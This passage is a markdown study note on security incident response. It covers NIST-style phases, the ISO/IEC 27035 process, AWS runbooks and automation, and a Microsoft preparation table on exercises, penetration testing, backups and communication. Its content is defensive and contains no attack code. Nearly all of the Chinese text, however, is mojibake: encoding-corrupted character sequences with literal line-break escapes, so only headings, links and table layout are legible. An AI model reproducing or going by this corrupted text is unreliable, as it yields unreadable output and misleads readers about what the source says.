Preparationï¼šäººå‘˜ï¼Œè¿‡ç¨‹ï¼ŒæŠ€æœ¯ä¸‰ä¸ªç»´åº¦å±•å¼€\r\n  - Detection and Analysisï¼šç›‘æ§å‘Šè­¦ã€ä¸»åŠ¨å‘ç°ï¼ˆå¨èƒç‹©çŒï¼‰å’Œåˆ†æå¤„ç½®\r\n  - Containment, Eradication, and Recoveryï¼šæ­¢æŸå¹¶æ¢å¤ä»»ä½•å—å½±å“çš„èµ„æºã€æ•°æ®å’Œ/æˆ–æµç¨‹\r\n  - Post-Incident Activity\r\n    - ç»éªŒæ•™è®­\r\n    - è¿‡ç¨‹åˆ†æï¼šå¤„ç½®æ—¶é—´ã€ä¸»è§‚/å®¢è§‚è¯„ä»·ã€\r\n    - è¯æ®ä¿ç•™\r\n\r\nISO/IEC 27035\r\n\r\n- ![eoPGpA](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/eoPGpA.jpg)\r\n- ç›®æ ‡ä¸èŒƒå›´\r\n  - ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„æ”»å‡»ä¸æ–­æ¼”å˜ï¼Œä¹Ÿå¯¹å®ä½“é€ æˆæ›´å¤šæŸå®³ã€‚å› æ­¤ï¼Œæ¯ä¸ªç»„ç»‡éƒ½éœ€è¦æœ‰ä¸€ä¸ªä¸€è‡´çš„äº‹ä»¶å“åº”è®¡åˆ’ (IRP) å’Œäº‹ä»¶ç®¡ç†æŠ€èƒ½ï¼Œä»¥æ ¹æ®é£é™©è¯„ä¼°çš„ç»“æœå‡è½»å¼±ç‚¹ã€ä¿æŒä¸šåŠ¡è¿è¡Œã€æœ€å¤§é™åº¦åœ°å‡å°‘æŸå¤±å’Œå£°èª‰ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå®ƒæœ‰åŠ©äºå‡å°‘å‘ç”Ÿçš„äº‹ä»¶ï¼ŒåŒæ—¶è¦è®°ä½å¹¶éæ‰€æœ‰äº‹ä»¶éƒ½å¯ä»¥é¢„é˜²ã€‚\r\n  - ISO (27035:2016) å›½é™…æ ‡å‡†ä¸ºå¤§ä¸­å‹ç»„ç»‡æä¾›ä¿¡æ¯å®‰å…¨äº‹ä»¶ç®¡ç†å‘å¸ƒçš„æŒ‡å—ã€æŠ€æœ¯å’Œæœ€ä½³å®è·µã€‚é™¤äº†å°å‹ç»„ç»‡å¯ä»¥éµå¾ªåŸºæœ¬ç¨‹åºé›†å’Œæ¨èçš„å›½é™…äº‹ä»¶ç®¡ç†å®è·µå¤–ï¼Œè¿˜å¯ä»¥æä¾›å¤–éƒ¨å„æ–¹æ¥å¤„ç†ä¿¡æ¯å®‰å…¨äº‹ä»¶ã€‚\r\n- **ä¿¡æ¯å®‰å…¨äº‹ä»¶é“¾**è§ä¸‹å›¾ï¼š\r\n  - ![xqhOZq](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/xqhOZq.jpg)\r\n- å¸¸è§å®‰å…¨å“åº”å›¢é˜Ÿçš„ç±»å‹å¦‚ä¸‹ï¼š\r\n  - ![Uo6lq1](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/Uo6lq1.jpg)\r\n- æ•´ä½“æµç¨‹å¯ä»¥åˆ†ä¸ºï¼š\r\n  - Plan & Prepareï¼šä¸ºäº‹ä»¶ç®¡ç†æ”¿ç­–è®¡åˆ’å’Œå‡†å¤‡é€‚å½“çš„è®¡åˆ’ï¼Œå¹¶è€ƒè™‘å°†äº‹ä»¶ç®¡ç†ã€æ¼æ´ç®¡ç†è®¡åˆ’çº³å…¥æ­¤é˜¶æ®µï¼ŒåŒ…æ‹¬æ•´ä½“æµç¨‹ã€æ”¿ç­–ã€æ“ä½œå·¥å…·ã€æ¨¡æ¿ã€è§’è‰²å’ŒèŒè´£ã€‚\r\n  - Identify. Detect, &Reportï¼šè¯¥è¿‡ç¨‹æ£€æµ‹ã€æ”¶é›†ä¸å®‰å…¨äº‹ä»¶ç›¸å…³çš„ä¿¡æ¯å¹¶æŠ¥å‘Šå®‰å…¨äº‹ä»¶ï¼Œä¿¡æ¯å®‰å…¨äº‹ä»¶å’Œäº‹ä»¶æµç¨‹å›¾å¦‚ä¸‹ï¼š\r\n    - ![5dEPex](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/5dEPex.jpg)\r\n  - Assessment & Decisionï¼šè¿›è¡Œè¯„ä¼°ä»¥ç¡®å®šå®‰å…¨äº‹ä»¶æ˜¯å¦å¤„äºå¯èƒ½æ€§æˆ–è¯¯æŠ¥çŠ¶æ€ï¼Œæˆ–å·²ç»“æŸã€‚ISIRT è¿›è¡Œè¯„ä¼°ä»¥ç¡®è®¤ PoC çš„è¯„ä¼°ç»“æœï¼Œä»¥äº†è§£äº‹ä»¶çš„çœŸå‡ï¼›åº”æ ¹æ®ç»“æœè¿›è¡ŒäºŒæ¬¡è¯„ä¼°ã€‚\r\n  - Responsesï¼šæœ‰å“åº”éƒ½æ˜¯æ ¹æ®å†³ç­–é˜¶æ®µçš„è¾“å‡ºåšå‡ºçš„ï¼Œå¯ä»¥åœ¨å®æ—¶åŸºç¡€ä¸Šæˆ–åœ¨å–è¯åˆ†ææ“ä½œçš„å¸®åŠ©ä¸‹åœ¨ç¡®å®šçš„æ—¶é—´èŒƒå›´å†…ç«‹å³åšå‡ºå“åº”ã€‚\r\n  - Lessons learntï¼šåŒ…æ‹¬ä¿¡æ¯å®‰å…¨å–è¯åˆ†æã€ç¡®å®šç»éªŒæ•™è®­ã€æ”¹è¿›ä¿¡æ¯å®‰å…¨æ§åˆ¶å®æ–½å’Œä¿¡æ¯å®‰å…¨é£é™©è¯„ä¼°å’Œç®¡ç†å®¡æŸ¥ç»“æœã€ä¿¡æ¯å®‰å…¨äº‹ä»¶ç®¡ç†è®¡åˆ’å’Œå…¶ä»–æ”¹è¿›ã€‚\r\n\r\n# 2. è¡Œä¸šå®è·µ\r\n## 2.1. AWS\r\næ•´ä½“æµç¨‹ä¸ºï¼š\r\n- å‡†å¤‡é˜¶æ®µ\r\n  - äººå‘˜ï¼šå°½ç®¡è‡ªåŠ¨åŒ–ç¨‹åº¦æœ‰æ‰€æé«˜ï¼Œä½†å®‰å…¨ç»„ç»‡å†…çš„åˆ†æå¸ˆå’Œå“åº”è€…ä»æœ‰è®¸å¤šå·¥ä½œè¦åšã€‚åŒè´¨åŒ–çš„å›¢é˜Ÿä¼šäº§ç”Ÿç›²ç‚¹ï¼Œå› æ­¤å¿…é¡»å»ºç«‹ä¸€ä¸ªå¤šå…ƒåŒ–çš„å›¢é˜Ÿï¼Œåœ¨å¤æ‚å¤šå˜çš„æƒ…å†µä¸‹æä¾›ä¸åŒçš„æ€æƒ³ä½“ç³»ã€æ–‡åŒ–è§†è§’ä»¥åŠå·¥ä½œå’Œç”Ÿæ´»ç»éªŒã€‚åŒ…æ‹¬ï¼šç¡®å®šè§’è‰²å’ŒèŒè´£ã€å“åº”æœºåˆ¶ç­‰\r\n  - æŠ€æœ¯ï¼šä½¿ç”¨AWSæä¾›çš„ç›¸å…³å·¥å…·/æ¥å£è®¿é—®äº‹ä»¶æ‰€æ¶‰åŠçš„ç¯å¢ƒå’Œèµ„æº\r\n- æ¨¡æ‹Ÿé˜¶æ®µ\r\n  - å®‰å…¨äº‹ä»¶å“åº”æ¨¡æ‹Ÿ (SIRS) ï¼Œå¯æä¾›ç»“æ„åŒ–æœºä¼šåœ¨ç°å®åœºæ™¯ä¸­ç»ƒä¹ äº‹ä»¶å“åº”è®¡åˆ’å’Œç¨‹åº\r\n- æŒç»­è¿­ä»£\r\n  - åˆ›å»ºRunbookï¼šæå‰è®¡åˆ’å¹¶å®šä¹‰è‡ªå·±çš„å®‰å…¨å“åº”ç¨‹åºï¼Œå‚è€ƒ[è¿™é‡Œ](https://github.com/aws-samples/aws-incident-response-playbooks/blob/0d9a1c0f7ad68fb2c1b2d86be8914f2069492e21/runbooks/runbook%20sample%20-%20credential%20leakage.md)\r\n  - è‡ªåŠ¨åŒ–èƒ½åŠ›ï¼šAWSæä¾›äº†ä¸€æ•´å¥—APIå’Œå·¥å…·æ¥å®ç°è‡ªåŠ¨åŒ–åº”æ€¥å“åº”ï¼Œä¸åŒçš„å·¥å…·å¯¹æ¯”å¦‚ä¸‹ï¼šä¾‹å¦‚ï¼ŒAWS Lambda æä¾›æ›´å¿«çš„é€Ÿåº¦å¹¶ä¸”éœ€è¦æ›´å°‘çš„æŠ€æœ¯æŠ€èƒ½ã€‚AWS Fargate æä¾›æ›´å¤§çš„çµæ´»     æ€§ï¼Œå¹¶ä¸”éœ€è¦æ›´å°‘çš„ç»´æŠ¤å’ŒæŠ€æœ¯æŠ€èƒ½ã€‚\r\n  - ![kALK8g](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/kALK8g.jpg)\r\n\r\n## 2.2. Microsoft\r\n- æ ¸å¿ƒè¡¡é‡æŒ‡æ ‡ä¸ºï¼š**å¹³å‡ç¡®è®¤æ—¶é—´ (MTTA)** å’Œ **å¹³å‡è¡¥æ•‘æ—¶é—´ (MTTR)**\r\n- å“åº”è®¡åˆ’ï¼Œè§ä¸‹è¡¨\r\n\r\n| æ´»åŠ¨                     | æè¿°                                                         | ç›Šå¤„                                                         |\r\n| ------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\r\n| æ¡Œé¢ç»ƒä¹                  | å¯¹å¯é¢„è§çš„å½±å“ä¸šåŠ¡çš„ç½‘ç»œäº‹ä»¶è¿›è¡Œå‘¨æœŸæ€§çš„æ¡Œé¢ç»ƒä¹ ï¼Œè¿«ä½¿æ‚¨çš„ç»„ç»‡çš„ç®¡ç†å±‚è€ƒè™‘åŸºäºé£é™©çš„å›°éš¾å†³ç­–ã€‚ | ç‰¢å›ºç¡®ç«‹å¹¶è¯´æ˜ç½‘ç»œå®‰å…¨æ˜¯ä¸€ä¸ªä¸šåŠ¡é—®é¢˜ã€‚å‘å±•è‚Œè‚‰è®°å¿†ï¼Œå¹¶åœ¨æ•´ä¸ªç»„ç»‡ä¸­å‘ç°å›°éš¾çš„å†³ç­–å’Œå†³ç­–æƒé—®é¢˜ã€‚ |\r\n| ç¡®å®šæ”»å‡»å‰å†³ç­–å’Œå†³ç­–è€…   | ä½œä¸ºå¯¹æ¡Œé¢ç»ƒä¹ çš„è¡¥å……ï¼Œç¡®å®šåŸºäºé£é™©çš„å†³ç­–ã€å†³ç­–æ ‡å‡†ä»¥åŠå¿…é¡»ç”±è°æ¥åˆ¶å®šå’Œæ‰§è¡Œè¿™äº›å†³ç­–ã€‚ä¾‹å¦‚ï¼šè°/ä½•æ—¶/æ˜¯å¦å‘æ‰§æ³•éƒ¨é—¨å¯»æ±‚å¸®åŠ©ï¼Ÿè°/ä½•æ—¶/å¦‚æœæ‹›å‹Ÿäº‹ä»¶å“åº”è€…ï¼Ÿè°/ä½•æ—¶/æ˜¯å¦æ”¯ä»˜èµé‡‘ï¼Ÿè°/ä½•æ—¶/å¦‚æœé€šçŸ¥å¤–éƒ¨å®¡è®¡å¸ˆï¼Ÿè°/ä½•æ—¶/å¦‚æœé€šçŸ¥éšç§ç›‘ç®¡æœºæ„ï¼Ÿè°/ä½•æ—¶/å¦‚æœé€šçŸ¥è¯åˆ¸ç›‘ç®¡æœºæ„ï¼Ÿè°/ä½•æ—¶/å¦‚æœé€šçŸ¥è‘£äº‹ä¼šæˆ–å®¡è®¡å§”å‘˜ä¼šï¼Ÿè°æœ‰æƒå…³é—­å…³é”®ä»»åŠ¡å·¥ä½œè´Ÿè½½ï¼Ÿ | å®šä¹‰åˆå§‹å“åº”å‚æ•°å’Œè”ç³»äººï¼Œä»¥ç®€åŒ–å¯¹äº‹ä»¶çš„å“åº”ã€‚               |\r\n| ç»´æŠ¤ç‰¹æƒ                 | ä¸€èˆ¬æ¥è¯´ï¼Œå»ºè®®å¯ä»¥äº«æœ‰ç‰¹æƒï¼Œä½†äº‹å®æ˜¯å¯ä»¥å‘ç°çš„ã€‚åŸ¹è®­å…³é”®äº‹ä»¶è´Ÿè´£äººåœ¨ç‰¹æƒä¸‹äº¤æµå»ºè®®ã€äº‹å®å’Œæ„è§ï¼Œä»¥ä¾¿ä¿ç•™ç‰¹æƒå¹¶é™ä½é£é™©ã€‚ | è€ƒè™‘åˆ°åŒ…æ‹¬ç”µå­é‚®ä»¶ã€åä½œå¹³å°ã€èŠå¤©ã€æ–‡æ¡£ã€å·¥ä»¶åœ¨å†…çš„ä¼—å¤šé€šä¿¡æ¸ é“ï¼Œç»´æŠ¤ç‰¹æƒå¯èƒ½æ˜¯ä¸€ä¸ªæ··ä¹±çš„è¿‡ç¨‹ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Microsoft Teams Roomsã€‚äº‹ä»¶äººå‘˜å’Œæ”¯æŒå¤–éƒ¨ç»„ç»‡çš„ä¸€è‡´æ–¹æ³•å¯ä»¥å¸®åŠ©å‡å°‘ä»»ä½•æ½œåœ¨çš„æ³•å¾‹é£é™©ã€‚ |\r\n| å†…å¹•äº¤æ˜“æ³¨æ„äº‹é¡¹         | è€ƒè™‘å‘ç®¡ç†å±‚å‘å‡ºé€šçŸ¥ï¼Œä»¥å‡å°‘è¯åˆ¸è¿è§„é£é™©ã€‚                   | è‘£äº‹ä¼šå’Œå¤–éƒ¨å®¡è®¡å¸ˆå¾€å¾€ä¼šæ„è¯†åˆ°ï¼Œæ‚¨å¯ä»¥é‡‡å–ç¼“è§£æªæ–½æ¥é™ä½åŠ¨è¡æ—¶æœŸå‡ºç°å¯ç–‘è¯åˆ¸äº¤æ˜“çš„é£é™©ã€‚ |\r\n| äº‹ä»¶è§’è‰²å’Œè´£ä»»æ‰‹å†Œ       | å»ºç«‹åŸºæœ¬çš„è§’è‰²å’ŒèŒè´£ï¼Œä½¿å„ç§æµç¨‹ä¿æŒä¸“æ³¨å¹¶å‘å‰æ¨è¿›ã€‚å½“æ‚¨çš„å“åº”å›¢é˜Ÿå¤„äºè¿œç¨‹ä½ç½®æ—¶ï¼Œå¯èƒ½éœ€è¦é¢å¤–è€ƒè™‘æ—¶åŒºå¹¶é€‚å½“åœ°ç§»äº¤ç»™è°ƒæŸ¥äººå‘˜æ‚¨å¯èƒ½å¿…é¡»åœ¨å¯èƒ½æ¶‰åŠçš„å…¶ä»–å›¢é˜Ÿä¹‹é—´è¿›è¡Œæ²Ÿé€šï¼Œä¾‹å¦‚ä¾›åº”å•†å›¢é˜Ÿã€‚ | æŠ€æœ¯äº‹ä»¶è´Ÿè´£äººâ€”â€”å§‹ç»ˆåœ¨äº‹ä»¶ä¸­ï¼Œç»¼åˆè¾“å…¥å’Œå‘ç°å¹¶è®¡åˆ’ä¸‹ä¸€æ­¥è¡ŒåŠ¨ã€‚æ²Ÿé€šè”ç»œâ€”â€”æ¶ˆé™¤æŠ€æœ¯äº‹ä»¶è´Ÿè´£äººä¸ç®¡ç†å±‚æ²Ÿé€šçš„è´Ÿæ‹…ï¼Œè¿™æ ·ä»–ä»¬å°±å¯ä»¥ç»§ç»­å‚ä¸äº‹ä»¶è€Œä¸ä¼šå¤±å»ç„¦ç‚¹ã€‚è¿™åº”è¯¥åŒ…æ‹¬ç®¡ç†é«˜ç®¡ä¿¡æ¯å’Œäº’åŠ¨ä»¥åŠç›‘ç®¡æœºæ„ç­‰å…¶ä»–ç¬¬ä¸‰æ–¹ã€‚äº‹ä»¶è®°å½•å™¨â€”â€”æ¶ˆé™¤äº†äº‹ä»¶å“åº”è€…è®°å½•è°ƒæŸ¥ç»“æœã€å†³ç­–å’Œè¡ŒåŠ¨çš„è´Ÿæ‹…ï¼Œå¹¶ä»å¤´åˆ°å°¾å‡†ç¡®åœ°è®°å½•äº†äº‹ä»¶ã€‚è¿œæœŸè§„åˆ’å¸ˆâ€“ ä¸ä»»åŠ¡å…³é”®å‹ä¸šåŠ¡æµç¨‹æ‰€æœ‰è€…åˆä½œï¼Œåˆ¶å®šä¸šåŠ¡è¿ç»­æ€§æ´»åŠ¨å’Œå‡†å¤‡å·¥ä½œï¼Œä»¥è€ƒè™‘æŒç»­ 24ã€48ã€72ã€96 å°æ—¶æˆ–æ›´é•¿æ—¶é—´çš„ä¿¡æ¯ç³»ç»ŸæŸå®³ã€‚å…¬å…±å…³ç³»â€”â€”å¦‚æœå‘ç”Ÿå¯èƒ½å¼•èµ·å…¬ä¼—å…³æ³¨çš„äº‹ä»¶ï¼Œå¹¶ä¸ Forward Planner ä¸€èµ·ï¼Œè€ƒè™‘å¹¶èµ·è‰è§£å†³å¯èƒ½ç»“æœçš„å…¬å…±æ²Ÿé€šæ–¹æ³•ã€‚ |\r\n| éšç§äº‹ä»¶å“åº”æ‰‹å†Œ         | ä¸ºäº†æ»¡è¶³æ—¥ç›Šä¸¥æ ¼çš„éšç§æ³•è§„ï¼Œåœ¨ SecOps å’Œéšç§åŠå…¬å®¤ä¹‹é—´åˆ¶å®šä¸€ä¸ªå…±åŒæ‹¥æœ‰çš„å‰§æœ¬ï¼Œä»¥ä¾¿å¿«é€Ÿè¯„ä¼°ç”±å®‰å…¨äº‹ä»¶å¼•èµ·çš„æœ‰åˆç†æ¦‚ç‡çš„æ½œåœ¨éšç§é—®é¢˜ã€‚ | è¯„ä¼°å®‰å…¨äº‹ä»¶å¯¹éšç§çš„æ½œåœ¨å½±å“æ˜¯å¾ˆå›°éš¾çš„ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨äº‹ä»¶éƒ½å‘ç”Ÿåœ¨æŠ€æœ¯å«é‡é«˜çš„ SOC ä¸­ï¼Œå¿…é¡»è¿…é€Ÿå°†å…¶æäº¤ç»™ç¡®å®šç›‘ç®¡é£é™©çš„éšç§åŠå…¬å®¤ï¼Œé€šå¸¸éœ€è¦ 72 å°æ—¶é€šçŸ¥ã€‚ |\r\n| æ¸—é€æµ‹è¯•                 | é’ˆå¯¹å…³é”®ä¸šåŠ¡ç³»ç»Ÿã€å…³é”®åŸºç¡€è®¾æ–½å’Œå¤‡ä»½è¿›è¡Œæ—¶é—´ç‚¹æ¨¡æ‹Ÿæ”»å‡»ï¼Œä»¥è¯†åˆ«å®‰å…¨æ€åŠ¿ä¸­çš„å¼±ç‚¹ã€‚è¿™é€šå¸¸ç”±ä¸€ä¸ªå¤–éƒ¨ä¸“å®¶å›¢é˜Ÿæ‰§è¡Œï¼Œä¸“æ³¨äºç»•è¿‡é¢„é˜²æ€§æ§åˆ¶å¹¶å‘ç°å…³é”®æ¼æ´ã€‚ | é‰´äºæœ€è¿‘å‘ç”Ÿçš„äººä¸ºå‹’ç´¢è½¯ä»¶äº‹ä»¶ï¼Œåº”é’ˆå¯¹èŒƒå›´æ‰©å¤§çš„åŸºç¡€è®¾æ–½è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç‰¹åˆ«æ˜¯æ”»å‡»å’Œæ§åˆ¶å…³é”®ä»»åŠ¡ç³»ç»Ÿå’Œæ•°æ®å¤‡ä»½çš„èƒ½åŠ›ã€‚ |\r\n| çº¢é˜Ÿ/è“é˜Ÿ/ç´«é˜Ÿ/ç»¿é˜Ÿ      | å¯¹å…³é”®ä¸šåŠ¡ç³»ç»Ÿã€å…³é”®åŸºç¡€è®¾æ–½ã€å¤‡ä»½è¿›è¡Œè¿ç»­æˆ–å®šæœŸæ¨¡æ‹Ÿæ”»å‡»ï¼Œä»¥è¯†åˆ«å®‰å…¨æ€åŠ¿ä¸­çš„å¼±ç‚¹ã€‚è¿™é€šå¸¸ç”±å†…éƒ¨æ”»å‡»å›¢é˜Ÿï¼ˆçº¢é˜Ÿï¼‰è¿›è¡Œï¼Œä»–ä»¬ä¸“æ³¨äºæµ‹è¯•æ£€æµ‹æ§åˆ¶å’Œå›¢é˜Ÿï¼ˆè“é˜Ÿï¼‰çš„æœ‰æ•ˆæ€§ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Microsoft 365 Defender for Office 365 çš„æ”»å‡»æ¨¡æ‹ŸåŸ¹è®­å’ŒMicrosoft 365 Defender for Endpoint çš„æ”»å‡»æ•™ç¨‹å’Œæ¨¡æ‹Ÿã€‚ | çº¢è‰²ã€è“è‰²å’Œç´«è‰²å›¢é˜Ÿæ”»å‡»æ¨¡æ‹Ÿï¼Œå¦‚æœåšå¾—å¥½ï¼Œæœ‰å¤šç§ç”¨é€”ï¼š1ã€å…è®¸æ•´ä¸ª IT ç»„ç»‡çš„å·¥ç¨‹å¸ˆæ¨¡æ‹Ÿå¯¹ä»–ä»¬è‡ªå·±çš„åŸºç¡€è®¾æ–½å­¦ç§‘çš„æ”»å‡»ã€‚2ã€è¡¨é¢å¯è§æ€§å’Œæ£€æµ‹æ–¹é¢çš„å·®è·ã€‚3ã€å…¨é¢æé«˜å®‰å…¨å·¥ç¨‹æŠ€èƒ½ï¼›ä½œä¸ºä¸€ä¸ªæ›´è¿ç»­å’Œæ‰©å±•çš„è¿‡ç¨‹ã€‚ç»¿è‰²å›¢é˜Ÿå®æ–½ IT æˆ–å®‰å…¨é…ç½®çš„æ›´æ”¹ã€‚ |\r\n| ä¸šåŠ¡è¿ç»­æ€§è§„åˆ’           | å¯¹äºä»»åŠ¡å…³é”®å‹ä¸šåŠ¡æµç¨‹ï¼Œè®¾è®¡å’Œæµ‹è¯•è¿ç»­æ€§æµç¨‹ï¼Œä½¿æœ€å°çš„å¯è¡Œä¸šåŠ¡åœ¨ä¿¡æ¯ç³»ç»Ÿå—æŸæœŸé—´èƒ½å¤Ÿæ­£å¸¸è¿è¡Œã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨Azure å¤‡ä»½å’Œæ¢å¤è®¡åˆ’åœ¨æ”»å‡»æœŸé—´ä¿æŠ¤æ‚¨çš„å…³é”®ä¸šåŠ¡ç³»ç»Ÿï¼Œä»¥ç¡®ä¿æ‚¨çš„ä¸šåŠ¡è¿è¥å¿«é€Ÿæ¢å¤ã€‚ | å¼ºè°ƒæ²¡æœ‰é’ˆå¯¹ IT ç³»ç»Ÿå—æŸæˆ–ç¼ºå¤±çš„è¿ç»­æ€§è§£å†³æ–¹æ³•è¿™ä¸€äº‹å®ã€‚ä¸ç®€å•çš„å¤‡ä»½å’Œæ¢å¤ç›¸æ¯”ï¼Œå¯ä»¥å¼ºè°ƒå¤æ‚çš„æ•°å­—å¼¹æ€§çš„éœ€æ±‚å’Œèµ„é‡‘ã€‚ |\r\n| ç¾éš¾æ¢å¤                 | å¯¹äºæ”¯æŒå…³é”®ä¸šåŠ¡æµç¨‹çš„ä¿¡æ¯ç³»ç»Ÿï¼Œæ‚¨åº”è¯¥è®¾è®¡å’Œæµ‹è¯•çƒ­/å†·å’Œçƒ­/æ¸©å¤‡ä»½å’Œæ¢å¤æ–¹æ¡ˆï¼ŒåŒ…æ‹¬åˆ†æ®µæ—¶é—´ã€‚ | è¿›è¡Œè£¸æœºæ„å»ºçš„ç»„ç»‡ç»å¸¸å‘ç°æ— æ³•å¤åˆ¶æˆ–ä¸ç¬¦åˆæœåŠ¡æ°´å¹³ç›®æ ‡çš„æ´»åŠ¨ã€‚å¤šæ¬¡åœ¨ä¸å—æ”¯æŒçš„ç¡¬ä»¶ä¸Šè¿è¡Œçš„å…³é”®ä»»åŠ¡ç³»ç»Ÿæ— æ³•æ¢å¤åˆ°ç°ä»£ç¡¬ä»¶ã€‚å¤‡ä»½çš„è¿˜åŸé€šå¸¸æœªç»æµ‹è¯•å¹¶ä¸”ä¼šé‡åˆ°é—®é¢˜ã€‚å¤‡ä»½å¯èƒ½ä¼šè¿›ä¸€æ­¥è„±æœºï¼Œå› æ­¤æš‚å­˜æ—¶é—´æœªè®¡å…¥æ¢å¤ç›®æ ‡ã€‚ |\r\n| å¸¦å¤–é€šä¿¡                 | å‡†å¤‡å¥½åœ¨ç”µå­é‚®ä»¶å’Œåä½œæœåŠ¡å—æŸã€æ–‡æ¡£åº“è¢«å‹’ç´¢ä»¥åŠäººå‘˜ç”µè¯å·ç ä¸å¯ç”¨æ—¶å¦‚ä½•æ²Ÿé€šã€‚ | å°½ç®¡è¿™æ˜¯ä¸€é¡¹å›°éš¾çš„å·¥ä½œï¼Œä½†è¦ç¡®å®šå­˜å‚¨ç”µè¯å·ç ã€æ‹“æ‰‘ã€æ„å»ºæ–‡æ¡£å’Œ IT æ¢å¤è¿‡ç¨‹çš„èµ„æºçš„ç¦»çº¿å’Œä¸å¯å˜å‰¯æœ¬å¦‚ä½•å­˜å‚¨åœ¨ç¦»çº¿è®¾å¤‡å’Œä½ç½®ä¸Šå¹¶å¤§è§„æ¨¡åˆ†å‘ã€‚ |\r\n| ç¡¬åŒ–ã€å«ç”Ÿå’Œç”Ÿå‘½å‘¨æœŸç®¡ç† | æ ¹æ® Internet å®‰å…¨ä¸­å¿ƒ (CIS) çš„ 20 å¤§å®‰å…¨æ§åˆ¶æªæ–½ï¼Œå¼ºåŒ–æ‚¨çš„åŸºç¡€æ¶æ„å¹¶æ‰§è¡Œå½»åº•çš„å«ç”Ÿæ´»åŠ¨ã€‚ | ä¸ºåº”å¯¹æœ€è¿‘å‘ç”Ÿçš„äººä¸ºå‹’ç´¢è½¯ä»¶äº‹ä»¶ï¼ŒMicrosoftå‘å¸ƒäº†å…·ä½“æŒ‡å—ï¼Œä»¥åŠ å¼ºå’Œä¿æŠ¤ç½‘ç»œæ”»å‡»æ€ä¼¤é“¾çš„æ¯ä¸ªé˜¶æ®µï¼Œæ— è®ºæ˜¯åˆ©ç”¨ Microsoft çš„èƒ½åŠ›è¿˜æ˜¯å…¶ä»–æä¾›å•†çš„èƒ½åŠ›ã€‚ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š1ã€åœ¨ç³»ç»Ÿè¢«å‹’ç´¢çš„æƒ…å†µä¸‹åˆ›å»ºå’Œç»´æŠ¤ä¸å¯å˜çš„å¤‡ä»½å‰¯æœ¬ã€‚æ‚¨å¯èƒ½è¿˜ä¼šè€ƒè™‘å¦‚ä½•ä¿ç•™ä¸å¯å˜çš„æ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¼šä½¿å¯¹æ‰‹æ©ç›–å…¶è¸ªè¿¹çš„èƒ½åŠ›å˜å¾—å¤æ‚ã€‚2ã€ä¸ç”¨äºç¾éš¾æ¢å¤çš„ä¸å—æ”¯æŒçš„ç¡¬ä»¶ç›¸å…³çš„é£é™©ã€‚ |\r\n| äº‹ä»¶å“åº”è®¡åˆ’             | åœ¨äº‹ä»¶å¼€å§‹æ—¶ï¼Œå†³å®šï¼š1ã€é‡è¦çš„ç»„ç»‡å‚æ•°ï¼›2ã€é‡è¦çš„ç»„ç»‡å‚æ•°ï¼›3ã€ç´§è¿«æ„Ÿï¼ˆä¾‹å¦‚ 24x7 å’Œè¥ä¸šæ—¶é—´ï¼‰ï¼›4ã€å·¥ä½œäººå‘˜åœ¨æ­¤æœŸé—´çš„å¯æŒç»­æ€§ã€‚ | æœ‰ä¸€ç§è¶‹åŠ¿æ˜¯åœ¨ä¸€å¼€å§‹å°±å°†æ‰€æœ‰å¯ç”¨èµ„æºæŠ•å…¥åˆ°äº‹ä»¶ä¸­ï¼Œå¹¶å¸Œæœ›å¿«é€Ÿè§£å†³ã€‚ä¸€æ—¦æ‚¨è®¤è¯†åˆ°æˆ–é¢„è®¡äº‹ä»¶ä¼šæŒç»­å¾ˆé•¿æ—¶é—´ï¼Œè¯·ä¸æ‚¨çš„å‘˜å·¥å’Œä¾›åº”å•†é‡‡å–ä¸åŒçš„å§¿æ€ï¼Œè®©ä»–ä»¬èƒ½å¤Ÿé€‚åº”æ›´é•¿æ—¶é—´ã€‚ |\r\n| äº‹ä»¶å“åº”è€…               | å½¼æ­¤å»ºç«‹æ˜ç¡®çš„æœŸæœ›ã€‚æŠ¥å‘Šæ­£åœ¨è¿›è¡Œçš„æ´»åŠ¨çš„æµè¡Œæ ¼å¼åŒ…æ‹¬ï¼š1ã€æˆ‘ä»¬åšäº†ä»€ä¹ˆï¼ˆç»“æœå¦‚ä½•ï¼‰ï¼Ÿ2ã€æˆ‘ä»¬åœ¨åšä»€ä¹ˆï¼ˆä»¥åŠå°†äº§ç”Ÿä»€ä¹ˆç»“æœä»¥åŠä½•æ—¶äº§ç”Ÿï¼‰ï¼Ÿæˆ‘ä»¬ä¸‹ä¸€æ­¥è®¡åˆ’åšä»€ä¹ˆï¼ˆä»€ä¹ˆæ—¶å€™å¯ä»¥æœŸå¾…ç»“æœï¼‰ï¼Ÿ | äº‹ä»¶å“åº”è€…é‡‡ç”¨ä¸åŒçš„æŠ€æœ¯å’Œæ–¹æ³•ï¼ŒåŒ…æ‹¬æ­»ç®±åˆ†æã€å¤§æ•°æ®åˆ†æä»¥åŠäº§ç”Ÿå¢é‡ç»“æœçš„èƒ½åŠ›ã€‚ä»æ˜ç¡®çš„æœŸæœ›å¼€å§‹å°†æœ‰åŠ©äºæ¸…æ™°çš„æ²Ÿé€šã€‚ |\r\n\r\n\t- ç›¸å…³æµç¨‹ï¼šå“åº”->æ¢å¤->è¿è¥\r\n\t- å“åº”æ‰‹å†Œï¼šå¦‚ï¼Œ[é’“é±¼å“åº”æ‰‹å†Œ](https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-phishing)\r\n\r\n- Microsoft 365 Defender çš„äº‹ä»¶å“åº”\r\n  - æ£€æµ‹\r\n    -  ![NRDjkn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/NRDjkn.jpg)\r\n  - å·¥ä½œæµç¨‹\r\n    - 